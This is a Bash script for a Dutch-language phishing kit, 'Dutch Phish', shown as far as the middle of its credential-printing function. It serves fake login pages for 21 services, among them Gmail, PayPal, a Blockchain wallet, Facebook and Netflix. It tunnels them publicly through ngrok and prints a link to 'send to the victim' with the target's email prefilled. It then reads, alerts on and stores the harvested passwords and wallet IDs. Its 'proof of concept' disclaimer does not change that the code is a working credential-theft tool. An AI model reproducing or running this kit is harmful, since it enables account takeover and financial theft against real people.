#!/bin/bash

# Dutch Phish - v1.0.2 (Juli 2020)
# Coded by: ERDesigns - Ernst Reidinga (c) 2020
# This tool is a proof of concept! Do not use it to gain illegal access to accounts you do now own!

# The sites/pages are made by ERDesigns.eu - Ernst Reidinga, and are made in VueJS.
# If you are interested in the sources of the sites you can contact me.

# Portions used from ShellPhish - thanks to Linux_choise
# ShellPhish is Coded by: linux_choice - https://github.com/thelinuxchoice/shellphish

trap 'printf "\n";stop;exit 1;clear;' 2


dependencies () {
	# Check if PHP is installed
	command -v php > /dev/null 2>&1 || { 
		echo >&2 "PHP is vereist! Installeer eerst PHP, en probeer het nogmaals."; 
		exit 1; 
	}
	# Check if CURL is installed
	command -v curl > /dev/null 2>&1 || { 
		echo >&2 "CURL is vereist! Installeer eerst CURL, en probeer het nogmaals."; 
		exit 1; 
	}
}

banner () {
	printf "\e[1;34m                                                                           _        \e[0m\n"
	printf "\e[1;34m ██████╗ ██╗   ██╗████████╗ ██████╗██╗  ██╗    ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗          O  o\e[0m\n"
	printf "\e[1;34m ██╔══██╗██║   ██║╚══██╔══╝██╔════╝██║  ██║    ██╔══██╗██║  ██║██║██╔════╝██║  ██║     _\_   o\e[0m\n"
	printf "\e[1;34m ██║  ██║██║   ██║   ██║   ██║     ███████║    ██████╔╝███████║██║███████╗███████║  \\/  o\ .\e[0m\n"
	printf "\e[1;34m ██║  ██║██║   ██║   ██║   ██║     ██╔══██║    ██╔═══╝ ██╔══██║██║╚════██║██╔══██║  //\___=\e[0m\n"
	printf "\e[1;34m ██████╔╝╚██████╔╝   ██║   ╚██████╗██║  ██║    ██║     ██║  ██║██║███████║██║  ██║     ''\e[0m\n"
	printf "\e[1;34m ╚═════╝  ╚═════╝    ╚═╝    ╚═════╝╚═╝  ╚═╝    ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝ \e[0m\e[1;34m 1.0.2\n"
	printf "\n" 
	printf "\e[1;34m                       .:.:.\e[0m\e[1;94m Nederlandse Phishing Kit \e[0m\e[1;34m.:.:.\e[0m\n"
	printf "\e[1;34m                    Gemaakt door ERDesigns.eu - Ernst Reidinga \e[0m\n"
	printf "\n"
	printf "\e[31m \e[31m\e[4mWaarschuwing\e[24m: ERDesigns - Ernst Reidinga is niet verantwoordelijk voor misbruik\e[0m\n"
	printf "\e[31m               of schade ten gevolge van het gebruik van Dutch Phish!\e[0m\n"
	printf "\n"
	printf "\e[31m-- \e[1;34mDeze tool is een Proof of Concept, en is \e[31m\e[4mniet\e[24m\e[1;34m bedoeld om gegevens te stelen! \e[31m--\e[0m\n"
	printf "\n"
	
}  

menu () {
	printf "\e[1;34m [** E-mail **]             [** Financieel **]             [** Social Media **]\n"
	printf "\e[1;34m ------------------------------------------------------------------------------\n"
	printf "\e[1;34m [\e[0m\e[1;31m01\e[0m\e[1;34m]\e[0m\e[1;94m GMail\e[0m                 \e[1;34m[\e[0m\e[1;31m05\e[0m\e[1;34m]\e[0m\e[1;94m Paypal\e[0m                    \e[1;34m[\e[0m\e[1;31m08\e[0m\e[1;34m]\e[0m\e[1;94m Twitter\e[0m\n"
	printf "\e[1;34m [\e[0m\e[1;31m02\e[0m\e[1;34m]\e[0m\e[1;94m Hotmail\e[0m               \e[1;34m[\e[0m\e[1;31m06\e[0m\e[1;34m]\e[0m\e[1;94m Blockchain\e[0m                \e[1;34m[\e[0m\e[1;31m09\e[0m\e[1;34m]\e[0m\e[1;94m Snapchat\e[0m\n"
	printf "\e[1;34m [\e[0m\e[1;31m03\e[0m\e[1;34m]\e[0m\e[1;94m KPN Mail\e[0m              \e[1;34m[\e[0m\e[1;31m07\e[0m\e[1;34m]\e[0m\e[1;94m Paysafe\e[0m                   \e[1;34m[\e[0m\e[1;31m10\e[0m\e[1;34m]\e[0m\e[1;94m Facebook\e[0m\n"
	printf "\e[1;34m [\e[0m\e[1;31m04\e[0m\e[1;34m]\e[0m\e[1;94m Ziggo Mail\e[0m                                           \e[1;34m[\e[0m\e[1;31m11\e[0m\e[1;34m]\e[0m\e[1;94m LinkedIn\e[0m\n"
	printf "                                                           \e[1;34m[\e[0m\e[1;31m12\e[0m\e[1;34m]\e[0m\e[1;94m Instagram\e[0m\n"
	printf "\n"
	printf "\e[1;34m [** Muziek **]             [** Film/TV **]                [** Cloud Opslag **]\n"
	printf "\e[1;34m ------------------------------------------------------------------------------\n"
	printf "\e[1;34m [\e[0m\e[1;31m13\e[0m\e[1;34m]\e[0m\e[1;94m Deezer\e[0m                \e[1;34m[\e[0m\e[1;31m14\e[0m\e[1;34m]\e[0m\e[1;94m Netflix\e[0m                   \e[1;34m[\e[0m\e[1;31m16\e[0m\e[1;34m]\e[0m\e[1;94m DropBox\e[0m\n"
	printf "\e[1;34m                            \e[1;34m[\e[0m\e[1;31m15\e[0m\e[1;34m]\e[0m\e[1;94m Videoland\e[0m\n"
	printf "\n"
	printf "\e[1;34m [** Verkoop **]            [** Games **]\n"
	printf "\e[1;34m ------------------------------------------------------------------------------\n"
	printf "\e[1;34m [\e[0m\e[1;31m17\e[0m\e[1;34m]\e[0m\e[1;94m 2eHands\e[0m               \e[1;34m[\e[0m\e[1;31m20\e[0m\e[1;34m]\e[0m\e[1;94m XBOX Live\e[0m\n"
	printf "\e[1;34m [\e[0m\e[1;31m18\e[0m\e[1;34m]\e[0m\e[1;94m Marktplaats\e[0m           \e[1;34m[\e[0m\e[1;31m21\e[0m\e[1;34m]\e[0m\e[1;94m Playstation Network\e[0m\n"
	printf "\e[1;34m [\e[0m\e[1;31m19\e[0m\e[1;34m]\e[0m\e[1;94m Vinted\e[0m\n"
	printf "\n"
	printf "\e[1;34m ------------------------------------------------------------------------------\n"
	printf "\e[1;34m [\e[0m\e[1;31m99\e[0m\e[1;34m]\e[0m\e[1;31m Afsluiten\e[0m\n"

	# Read selection
	read -p $'\n\e[1;34m [\e[0m\e[1;91m*\e[0m\e[1;34m] Kies een pagina: \e[0m' option

	# Read victim email (default email)
	if [[ $option == 1 || $option == 01 || $option == 2 || $option == 02 || $option == 3 || $option == 03 || $option == 4 || $option == 04 ]]; then
		read -p $'\e[1;34m [\e[0m\e[1;91m*\e[0m\e[1;34m] E-Mailadres van het slachtoffer: \e[0m' defaultemail
	elif [[ $option == 5 || $option == 05 ]]; then
		read -p $'\e[1;34m [\e[0m\e[1;91m*\e[0m\e[1;34m] E-Mailadres of telefoonnummer van het slachtoffer: \e[0m' defaultpaypal
	elif [[ $option == 6 || $option == 06 ]]; then
		read -p $'\e[1;34m [\e[0m\e[1;91m*\e[0m\e[1;34m] Blockchain Versie: \e[0m' defaultblockchain
	elif [[ $option == 7 || $option == 07 ]]; then
		read -p $'\e[1;34m [\e[0m\e[1;91m*\e[0m\e[1;34m] Gebruikersnaam van het slachtoffer: \e[0m' defaultpaysafe
	elif [[ $option == 8 || $option == 08 ]]; then
		read -p $'\e[1;34m [\e[0m\e[1;91m*\e[0m\e[1;34m] E-Mailadres, telefoonnummer of gebruikersnaam van het slachtoffer: \e[0m' defaulttwitter
	elif [[ $option == 9 || $option == 09 ]]; then
		read -p $'\e[1;34m [\e[0m\e[1;91m*\e[0m\e[1;34m] E-Mailadres of gebruikersnaam van het slachtoffer: \e[0m' defaultsnapchat
	elif [[ $option == 10 ]]; then
		read -p $'\e[1;34m [\e[0m\e[1;91m*\e[0m\e[1;34m] E-Mailadres of telefoonnummer van het slachtoffer: \e[0m' defaultfacebook
	elif [[ $option == 11 ]]; then
		read -p $'\e[1;34m [\e[0m\e[1;91m*\e[0m\e[1;34m] E-Mailadres of telefoonnummer van het slachtoffer: \e[0m' defaultlinkedin
	elif [[ $option == 12 ]]; then
		read -p $'\e[1;34m [\e[0m\e[1;91m*\e[0m\e[1;34m] E-Mailadres, telefoonnummer of gebruikersnaam van het slachtoffer: \e[0m' defaultinstagram
	elif [[ $option == 13 ]]; then
		read -p $'\e[1;34m [\e[0m\e[1;91m*\e[0m\e[1;34m] E-Mailadres van het slachtoffer: \e[0m' defaultdeezer
	elif [[ $option == 14 ]]; then
		read -p $'\e[1;34m [\e[0m\e[1;91m*\e[0m\e[1;34m] E-Mailadres of telefoonnummer van het slachtoffer: \e[0m' defaultnetflix
	elif [[ $option == 15 ]]; then
		read -p $'\e[1;34m [\e[0m\e[1;91m*\e[0m\e[1;34m] E-Mailadres van het slachtoffer: \e[0m' defaultvideoland
	elif [[ $option == 16 ]]; then
		read -p $'\e[1;34m [\e[0m\e[1;91m*\e[0m\e[1;34m] E-Mailadres van het slachtoffer: \e[0m' defaultdropbox
	elif [[ $option == 17 ]]; then
		read -p $'\e[1;34m [\e[0m\e[1;91m*\e[0m\e[1;34m] E-Mailadres van het slachtoffer: \e[0m' default2ehands
	elif [[ $option == 18 ]]; then
		read -p $'\e[1;34m [\e[0m\e[1;91m*\e[0m\e[1;34m] E-Mailadres van het slachtoffer: \e[0m' defaultmarktplaats
	elif [[ $option == 19 ]]; then
		read -p $'\e[1;34m [\e[0m\e[1;91m*\e[0m\e[1;34m] E-Mailadres of gebruikersnaam van het slachtoffer: \e[0m' defaultvinted
	elif [[ $option == 20 ]]; then
		read -p $'\e[1;34m [\e[0m\e[1;91m*\e[0m\e[1;34m] E-Mailadres van het slachtoffer: \e[0m' defaultxboxlive
	elif [[ $option == 21 ]]; then
		read -p $'\e[1;34m [\e[0m\e[1;91m*\e[0m\e[1;34m] E-Mailadres van het slachtoffer: \e[0m' defaultplaystationnetwork
	fi

	# Convert selection to webpage and start
	if [[ $option == 1 || $option == 01 ]]; then
		server="gmail"
		start
	elif [[ $option == 2 || $option == 02 ]]; then
		server="hotmail"
		start
	elif [[ $option == 3 || $option == 03 ]]; then
		server="kpn-mail"
		start
	elif [[ $option == 4 || $option == 04 ]]; then
		server="ziggo-mail"
		start
	elif [[ $option == 5 || $option == 05 ]]; then
		server="paypal"
		start
	elif [[ $option == 6 || $option == 06 ]]; then
		server="blockchain"
		start
	elif [[ $option == 7 || $option == 07 ]]; then
		server="paysafe"
		start
	elif [[ $option == 8 || $option == 08 ]]; then
		server="twitter"
		start
	elif [[ $option == 9 || $option == 09 ]]; then
		server="snapchat"
		start
	elif [[ $option == 10 ]]; then
		printf "\n"
		printf "\e[1;34m [\e[0m\e[1;31m01\e[0m\e[1;34m]\e[0m\e[1;94m Facebook\e[0m\n"
		printf "\e[1;34m [\e[0m\e[1;31m02\e[0m\e[1;34m]\e[0m\e[1;94m Messenger\e[0m\n"
		read -p $'\n\e[1;34m [\e[0m\e[1;91m*\e[0m\e[1;34m] Kies een pagina: \e[0m' fboption
		if [[ $fboption == 1 || $fboption == 01 ]]; then
			server="facebook"
		elif [[ $fboption == 2 || $fboption == 02 ]]; then
			server="messenger"
		else
			printf "\e[1;34m [!]\e[31m Ongeldige Invoer!\e[0m\n"
			sleep 1
			clear
			banner
			menu
		fi
		start
	elif [[ $option == 11 ]]; then
		server="linkedin"
		start
	elif [[ $option == 12 ]]; then
		server="instagram"
		start
	elif [[ $option == 13 ]]; then
		server="deezer"
		start
	elif [[ $option == 14 ]]; then
		server="netflix"
		start
	elif [[ $option == 15 ]]; then
		server="videoland"
		start
	elif [[ $option == 16 ]]; then
		server="dropbox"
		start
	elif [[ $option == 17 ]]; then
		server="2ehands"
		start
	elif [[ $option == 18 ]]; then
		server="marktplaats"
		start
	elif [[ $option == 19 ]]; then
		server="vinted"
		start
	elif [[ $option == 20 ]]; then
		server="xbox-live"
		start
	elif [[ $option == 21 ]]; then
		server="playstation-network"
		start
	elif [[ $option == 99 ]]; then
		# User wants to exit
		exit 1
	else
		# No valid input!
		printf "\e[1;34m [!]\e[31m Ongeldige Invoer!\e[0m\n"
		sleep 1
		clear
		banner
		menu
	fi
}

start () {
	# Remove send link
	if [[ -e sendlink ]]; then
		rm -rf sendlink
	fi

	# Clear IP data
	if [[ -e websites/$server/ip.txt ]]; then
		rm -rf websites/$server/ip.txt
	fi

	# Clear credentials
	if [[ -e websites/$server/credentials.txt ]]; then
		rm -rf websites/$server/credentials.txt
	fi

	# Clear One Time Password
	if [[ -e websites/$server/otp.txt ]]; then
		rm -rf websites/$server/otp.txt
	fi

	# Check if NGROK is downloaded
	if [[ -e ngrok ]]; then
		echo ""
	else
		# Check for ZIP/UnZIP
		command -v unzip > /dev/null 2>&1 || { 
			echo >&2 "UNZIP is vereist! Installeer eerst UNZIP, en probeer het nogmaals."; 
			exit 1; 
		}
		# Check for WGET
		command -v wget > /dev/null 2>&1 || { 
			echo >&2 "WGET is vereist! Installeer eerst WGET, en probeer het nogmaals."; 
			exit 1; 
		}
		# Download NGROK
		printf " \e[1;34m[\e[0m*\e[1;34m] NGROK Downloaden..\n"
		arch=$(uname -a | grep -o 'arm' | head -n1)
		arch2=$(uname -a | grep -o 'Android' | head -n1)
		if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
			wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
			if [[ -e ngrok-stable-linux-arm.zip ]]; then
				unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
				chmod +x ngrok
				rm -rf ngrok-stable-linux-arm.zip
			else
				printf " \e[1;31m[!] Fout bij het downloaden! Termux, run:\e[0m\e[1;34m pkg install wget\e[0m\n"
				exit 1
			fi
		else
			wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
			if [[ -e ngrok-stable-linux-386.zip ]]; then
				unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
				chmod +x ngrok
				rm -rf ngrok-stable-linux-386.zip
			else
				printf " \e[1;31m[!] Fout bij het downloaden!\e[0m\n"
				exit 1
			fi
		fi
	fi
	# Start PHP
	printf " \e[1;34m[\e[0m*\e[1;34m] PHP starten...\n"
	cd sites/$server && php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
	sleep 2
	# Start NGROK
	printf " \e[1;34m[\e[0m*\e[1;34m] NGROK starten\n"
	./ngrok http 127.0.0.1:3333 > /dev/null 2>&1 &
	sleep 10

	# Print phishing links
	link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
	# Set default email in url
	if [[ $option == 1 || $option == 01 || $option == 2 || $option == 02 || $option == 3 || $option == 03 || $option == 4 || $option == 04 ]]; then
		if [[ ! -z "$defaultemail" ]]; then
			printf " \e[1;34m[\e[1;31m*\e[1;34m] Stuur deze link naar het slachtoffer:\e[0m\e[1;37m %s/?e=%s\e[0m\n" $link $defaultemail
		else
			printf " \e[1;34m[\e[1;31m*\e[1;34m] Stuur deze link naar het slachtoffer:\e[0m\e[1;37m %s\e[0m\n" $link
		fi
	elif [[ $option == 5 || $option == 05 ]]; then
		if [[ ! -z "$defaultpaypal" ]]; then
			printf " \e[1;34m[\e[1;31m*\e[1;34m] Stuur deze link naar het slachtoffer:\e[0m\e[1;37m %s/?e=%s\e[0m\n" $link $defaultpaypal
		else
			printf " \e[1;34m[\e[1;31m*\e[1;34m] Stuur deze link naar het slachtoffer:\e[0m\e[1;37m %s\e[0m\n" $link
		fi
	elif [[ $option == 6 || $option == 06 ]]; then
		if [[ ! -z "$defaultblockchain" ]]; then
			printf " \e[1;34m[\e[1;31m*\e[1;34m] Stuur deze link naar het slachtoffer:\e[0m\e[1;37m %s/?v=%s\e[0m\n" $link $defaultblockchain
		else
			printf " \e[1;34m[\e[1;31m*\e[1;34m] Stuur deze link naar het slachtoffer:\e[0m\e[1;37m %s\e[0m\n" $link
		fi
	elif [[ $option == 7 || $option == 07 ]]; then
		if [[ ! -z "$defaultpaysafe" ]]; then
			printf " \e[1;34m[\e[1;31m*\e[1;34m] Stuur deze link naar het slachtoffer:\e[0m\e[1;37m %s/?u=%s\e[0m\n" $link $defaultpaysafe
		else
			printf " \e[1;34m[\e[1;31m*\e[1;34m] Stuur deze link naar het slachtoffer:\e[0m\e[1;37m %s/?login_error=true\e[0m\n" $link
		fi
	elif [[ $option == 8 || $option == 08 ]]; then
		if [[ ! -z "$defaulttwitter" ]]; then
			printf " \e[1;34m[\e[1;31m*\e[1;34m] Stuur deze link naar het slachtoffer:\e[0m\e[1;37m %s/?e=%s\e[0m\n" $link $defaulttwitter
		else
			printf " \e[1;34m[\e[1;31m*\e[1;34m] Stuur deze link naar het slachtoffer:\e[0m\e[1;37m %s/?username_disabled=true\e[0m\n" $link
		fi
	elif [[ $option == 9 || $option == 09 ]]; then
		if [[ ! -z "$defaultsnapchat" ]]; then
			printf " \e[1;34m[\e[1;31m*\e[1;34m] Stuur deze link naar het slachtoffer:\e[0m\e[1;37m %s/?u=%s\e[0m\n" $link $defaultsnapchat
		else
			printf " \e[1;34m[\e[1;31m*\e[1;34m] Stuur deze link naar het slachtoffer:\e[0m\e[1;37m %s\e[0m\n" $link
		fi
	elif [[ $option == 10 ]]; then
		if [[ ! -z "$defaultfacebook" ]]; then
			printf " \e[1;34m[\e[1;31m*\e[1;34m] Stuur deze link naar het slachtoffer:\e[0m\e[1;37m %s/?e=%s\e[0m\n" $link $defaultfacebook
		else
			printf " \e[1;34m[\e[1;31m*\e[1;34m] Stuur deze link naar het slachtoffer:\e[0m\e[1;37m %s\e[0m\n" $link
		fi
	elif [[ $option == 11 ]]; then
		if [[ ! -z "$defaultlinkedin" ]]; then
			printf " \e[1;34m[\e[1;31m*\e[1;34m] Stuur deze link naar het slachtoffer:\e[0m\e[1;37m %s/?e=%s\e[0m\n" $link $defaultlinkedin
		else
			printf " \e[1;34m[\e[1;31m*\e[1;34m] Stuur deze link naar het slachtoffer:\e[0m\e[1;37m %s\e[0m\n" $link
		fi
	elif [[ $option == 12 ]]; then
		if [[ ! -z "$defaultinstagram" ]]; then
			printf " \e[1;34m[\e[1;31m*\e[1;34m] Stuur deze link naar het slachtoffer:\e[0m\e[1;37m %s/?l=%s\e[0m\n" $link $defaultinstagram
		else
			printf " \e[1;34m[\e[1;31m*\e[1;34m] Stuur deze link naar het slachtoffer:\e[0m\e[1;37m %s\e[0m\n" $link
		fi
	elif [[ $option == 13 ]]; then
		if [[ ! -z "$defaultdeezer" ]]; then
			printf " \e[1;34m[\e[1;31m*\e[1;34m] Stuur deze link naar het slachtoffer:\e[0m\e[1;37m %s/?e=%s\e[0m\n" $link $defaultdeezer
		else
			printf " \e[1;34m[\e[1;31m*\e[1;34m] Stuur deze link naar het slachtoffer:\e[0m\e[1;37m %s\e[0m\n" $link
		fi
	elif [[ $option == 14 ]]; then
		if [[ ! -z "$defaultnetflix" ]]; then
			printf " \e[1;34m[\e[1;31m*\e[1;34m] Stuur deze link naar het slachtoffer:\e[0m\e[1;37m %s/?e=%s\e[0m\n" $link $defaultnetflix
		else
			printf " \e[1;34m[\e[1;31m*\e[1;34m] Stuur deze link naar het slachtoffer:\e[0m\e[1;37m %s\e[0m\n" $link
		fi
	elif [[ $option == 15 ]]; then
		if [[ ! -z "$defaultvideoland" ]]; then
			printf " \e[1;34m[\e[1;31m*\e[1;34m] Stuur deze link naar het slachtoffer:\e[0m\e[1;37m %s/?e=%s\e[0m\n" $link $defaultvideoland
		else
			printf " \e[1;34m[\e[1;31m*\e[1;34m] Stuur deze link naar het slachtoffer:\e[0m\e[1;37m %s\e[0m\n" $link
		fi
	elif [[ $option == 16 ]]; then
		if [[ ! -z "$defaultdropbox" ]]; then
			printf " \e[1;34m[\e[1;31m*\e[1;34m] Stuur deze link naar het slachtoffer:\e[0m\e[1;37m %s/?e=%s\e[0m\n" $link $defaultdropbox
		else
			printf " \e[1;34m[\e[1;31m*\e[1;34m] Stuur deze link naar het slachtoffer:\e[0m\e[1;37m %s\e[0m\n" $link
		fi
	elif [[ $option == 17 ]]; then
		if [[ ! -z "$default2ehands" ]]; then
			printf " \e[1;34m[\e[1;31m*\e[1;34m] Stuur deze link naar het slachtoffer:\e[0m\e[1;37m %s/?e=%s\e[0m\n" $link $default2ehands
		else
			printf " \e[1;34m[\e[1;31m*\e[1;34m] Stuur deze link naar het slachtoffer:\e[0m\e[1;37m %s\e[0m\n" $link
		fi
	elif [[ $option == 18 ]]; then
		if [[ ! -z "$defaultmarktplaats" ]]; then
			printf " \e[1;34m[\e[1;31m*\e[1;34m] Stuur deze link naar het slachtoffer:\e[0m\e[1;37m %s/?e=%s\e[0m\n" $link $defaultmarktplaats
		else
			printf " \e[1;34m[\e[1;31m*\e[1;34m] Stuur deze link naar het slachtoffer:\e[0m\e[1;37m %s\e[0m\n" $link
		fi
	elif [[ $option == 19 ]]; then
		if [[ ! -z "$defaultvinted" ]]; then
			printf " \e[1;34m[\e[1;31m*\e[1;34m] Stuur deze link naar het slachtoffer:\e[0m\e[1;37m %s/?u=%s\e[0m\n" $link $defaultvinted
		else
			printf " \e[1;34m[\e[1;31m*\e[1;34m] Stuur deze link naar het slachtoffer:\e[0m\e[1;37m %s\e[0m\n" $link
		fi
	elif [[ $option == 20 ]]; then
		if [[ ! -z "$defaultxboxlive" ]]; then
			printf " \e[1;34m[\e[1;31m*\e[1;34m] Stuur deze link naar het slachtoffer:\e[0m\e[1;37m %s/?e=%s\e[0m\n" $link $defaultxboxlive
		else
			printf " \e[1;34m[\e[1;31m*\e[1;34m] Stuur deze link naar het slachtoffer:\e[0m\e[1;37m %s\e[0m\n" $link
		fi
	elif [[ $option == 21 ]]; then
		if [[ ! -z "$defaultplaystationnetwork" ]]; then
			printf " \e[1;34m[\e[1;31m*\e[1;34m] Stuur deze link naar het slachtoffer:\e[0m\e[1;37m %s/?e=%s\e[0m\n" $link $defaultplaystationnetwork
		else
			printf " \e[1;34m[\e[1;31m*\e[1;34m] Stuur deze link naar het slachtoffer:\e[0m\e[1;37m %s\e[0m\n" $link
		fi
	else
		printf " \e[1;34m[\e[1;31m*\e[1;34m] Stuur deze link naar het slachtoffer:\e[0m\e[1;37m %s\e[0m\n" $link
	fi

	# Wait for credentials
	waitforcredentials
}

stop () {
	NGR=$(ps aux | grep -o "ngrok" | head -n1)
	PHP=$(ps aux | grep -o "php" | head -n1)
	# Kill NGROK
	if [[ $NGR == *'ngrok'* ]]; then
		pkill -f -2 ngrok > /dev/null 2>&1
		killall -2 ngrok > /dev/null 2>&1
	fi
	# Kill PHP
	if [[ $PHP == *'php'* ]]; then
		pkill -f -2 php > /dev/null 2>&1
		killall -2 php > /dev/null 2>&1
	fi
	# Remove send link
	if [[ -e sendlink ]]; then
		rm -rf sendlink
	fi
}

alert () {
	notify-send "..:: Dutch Phish - Nieuwe LOG ::..

$1 | $2" --icon="$PWD/icons/$server.png" 
}

printcredentials () {
	# GMail / Hotmail / KPN Mail / Ziggo Mail
	if [[ $option == 1 || $option == 01 || $option == 2 || $option == 02 || $option == 3 || $option == 03 || $option == 4 || $option == 04 ]]; then
		email=$(grep -o 'E-Mail:.*' sites/$server/credentials.txt | cut -d ":" -f2)
		IFS=$'\n'
		passw=$(grep -o 'Wachtwoord:.*' sites/$server/credentials.txt | cut -d ":" -f2)
		printf " \e[1;34m[\e[0m\e[1;31m*\e[0m\e[1;34m]\e[0m\e[1;34m E-Mailadres...:\e[0m\e[1;37m%s\n\e[0m" $email
		printf " \e[1;34m[\e[0m\e[1;31m*\e[0m\e[1;34m]\e[0m\e[1;34m Wachtwoord....:\e[0m\e[1;37m%s\n\e[0m" $passw
		alert $email $passw
		cat sites/$server/credentials.txt >> sites/$server/saved.credentials.txt
	# Paypal
	elif [[ $option == 5 || $option == 05 ]]; then
		email=$(grep -o 'E-Mail:.*' sites/$server/credentials.txt | cut -d ":" -f2)
		IFS=$'\n'
		passw=$(grep -o 'Wachtwoord:.*' sites/$server/credentials.txt | cut -d ":" -f2)
		printf " \e[1;34m[\e[0m\e[1;31m*\e[0m\e[1;34m]\e[0m\e[1;34m E-Mailadres...:\e[0m\e[1;37m%s\n\e[0m" $email
		printf " \e[1;34m[\e[0m\e[1;31m*\e[0m\e[1;34m]\e[0m\e[1;34m Wachtwoord....:\e[0m\e[1;37m%s\n\e[0m" $passw
		alert $email $passw
		cat sites/$server/credentials.txt >> sites/$server/saved.credentials.txt
	# Blockchain
	elif [[ $option == 6 || $option == 06 ]]; then
		wallet=$(grep -o 'Wallet-ID:.*' sites/$server/credentials.txt | cut -d ":" -f2)
		IFS=$'\n'
		passw=$(grep -o 'Wachtwoord:.*' sites/$server/credentials.txt | cut -d ":" -f2)
		printf " \e[1;34m[\e[0m\e[1;31m*\e[0m\e[1;34m]\e[0m\e[1;34m Wallet-ID.....:\e[0m\e[1;37m%s\n\e[0m" $wallet
		printf " \e[1;34m[\e[0m\e[1;31m*\e[0m\e[1;34m]\e[0m\e[1;34m Wachtwoord....:\e[0m\e[1;37m%s\n\e[0m" $passw
		alert $email $passw
		cat sites/$server/credentials.txt >> sites/$server/saved.credentials.txt
	# Paysafe
	elif [[ $option == 7 || $option == 07 ]]; then
		usern=$(grep -o 'Gebruikersnaam:.*' sites/$server/credentials.txt | cut -d ":" -f2)
		IFS=$'\n'
		passw=$(grep -o 'Wachtwoord:.*' sites/$server/credentials.txt | cut -d ":" -f2)
		printf " \e[1;34m[\e[0m\e[1;31m*\e[0m\e[1;34m]\e[0m\e[1;34m Gebruikersnaam:\e[0m\e[1;37m%s\n\e[0m" $usern
		printf " \e[1;34m[\e[0m\e[1;31m*\e[0m\e[1;34m]\e[0m\e[1;34m Wachtwoord....:\e[0m\e[1;37m%s\n\e[0m" $passw
		alert $usern $passw
		cat sites/$server/credentials.txt >> sites/$server/saved.credentials.txt
	# Twitter
	elif [[ $option == 8 || $option == 08 ]]; then
		login=$(grep -o 'Gebruikersnaam:.*' sites/$server/credentials.txt | cut -d ":" -f2)
		IFS=$'\n'
		passw=$(grep -o 'Wachtwoord:.*' sites/$server/credentials.txt | cut -d ":" -f2)
		printf " \e[1;34m[\e[0m\e[1;31m*\e[0m\e[1;34m]\e[0m\e[1;34m Tel/Email/Gebr:\e[0m\e[1;37m%s\n\e[0m" $login
		printf " \e[1;34m[\e[0m\e[1;31m*\e[0m\e[1;34m]\e[0m\e[1;34m Wachtwoord....:\e[0m\e[1;37m%s\n\e[0m" $passw
		alert $login $passw
		cat sites/$server/credentials.txt >> sites/$server/saved.credentials.txt
	# Snapchat
	elif [[ $option == 9 || $option == 09 ]]; then
		usern=$(grep -o 'Gebruikersnaam:.*' sites/$server/credentials.txt | cut -d ":" -f2)
		IFS=$'\n'
		passw=$(grep -o 'Wachtwoord:.*' sites/$server/credentials.txt | cut -d ":" -f2)
		printf " \e[1;34m[\e[0m\e[1;31m*\e[0m\e[1;34m]\e[0m\e[1;34m Email/Gebr....:\e[0m\e[1;37m%s\n\e[0m" $usern
		printf " \e[1;34m[\e[0m\e[1;31m*\e[0m\e[1;34m]\e[0m\e[1;34m Wachtwoord....:\e[0m\e[1;37m%s\n\e[0m" $passw
		alert $usern $passw
		cat sites/$server/credentials.txt >> sites/$server/saved.credentials.txt
	# Facebook
	elif [[ $option == 10 ]]; then
		usern=$(grep -o 'E-Mail:.*' sites/$server/credentials.txt | cut -d ":" -f2)
		IFS=$'\n'
		passw=$(grep -o 'Wachtwoord:.*' sites/$server/credentials.txt | cut -d ":" -f2)
		printf " \e[1;34m[\e[0m\e[1;31m*\e[0m\e[1;34m]\e[0m\e[1;34m Tel/Email.....:\e[0m\e[1;37m%s\n\e[0m" $usern
		printf " \e[1;34m[\e[0m\e[1;31m*\e[0m\e[1;34m]\e[0m\e[1;34m Wachtwoord....:\e[0m\e[1;37m%s\n\e[0m" $passw
		alert $usern $passw
		cat sites/$server/credentials.txt >> sites/$server/saved.credentials.txt
	# LinkedIn
	elif [[ $option == 11 ]]; then
		usern=$(grep -o 'E-Mail:.*' sites/$server/credentials.txt | cut -d ":" -f2)
		IFS=$'\n'
		passw=$(grep -o 'Wachtwoord:.*' sites/$server/credentials.txt | cut -d ":" -f2)
		printf " \e[1;34m[\e[0m\e[1;31m*\e[0m\e[1;34m]\e[0m\e[1;34m Tel/Email.....:\e[0m\e[1;37m%s\n\e[0m" $usern
		printf " \e[1;34m[\e[0m\e[1;31m*\e[0m\e[1;34m]\e[0m\e[1;34m Wachtwoord....:\e[0m\e[1;37m%s\n\e[0m" $passw
		alert $usern $passw
		cat sites/$server/credentials.txt >> sites/$server/saved.credentials.txt
	# Instagram
	elif [[ $option == 12 ]]; then
		login=$(grep -o 'Gebruikersnaam:.*' sites/$server/credentials.txt | cut -d ":" -f2)
		IFS=$'\n'
		passw=$(grep -o 'Wachtwoord:.*' sites/$server/credentials.txt | cut -d ":" -f2)
		printf " \e[1;34m[\e[0m\e[1;31m*\e[0m\e[1;34m]\e[0m\e[1;34m Tel/Email/Gebr:\e[0m\e[1;37m%s\n\e[0m" $login
		printf " \e[1;34m[\e[0m\e[1;31m*\e[0m\e[1;34m]\e[0m\e[1;34m Wachtwoord....:\e[0m\e[1;37m%s\n\e[0m" $passw
		alert $login $passw
		cat sites/$server/credentials.txt >> sites/$server/saved.credentials.txt
	# Deezer
	elif [[ $option == 13 ]]; then
		email=$(grep -o 'E-Mail:.*' sites/$server/credentials.txt | cut -d ":" -f2)
		IFS=$'\n'
		passw=$(grep -o 'Wachtwoord:.*' sites/$server/credentials.txt | cut -d ":" -f2)
		printf " \e[1;34m[\e[0m\e[1;31m*\e[0m\e[1;34m]\e[0m\e[1;34m E-Mailadres...:\e[0m\e[1;37m%s\n\e[0m" $email
		printf " \e[1;34m[\e[0m\e[1;31m*\e[0m\e[1;34m]\e[0m\e[1;34m Wachtwoord....:\e[0m\e[1;37m%s\n\e[0m" $passw
		alert $email $passw
		cat sites/$server/credentials.txt >> sites/$server/saved.credentials.txt
	# Netflix
	elif [[ $option == 14 ]]; then
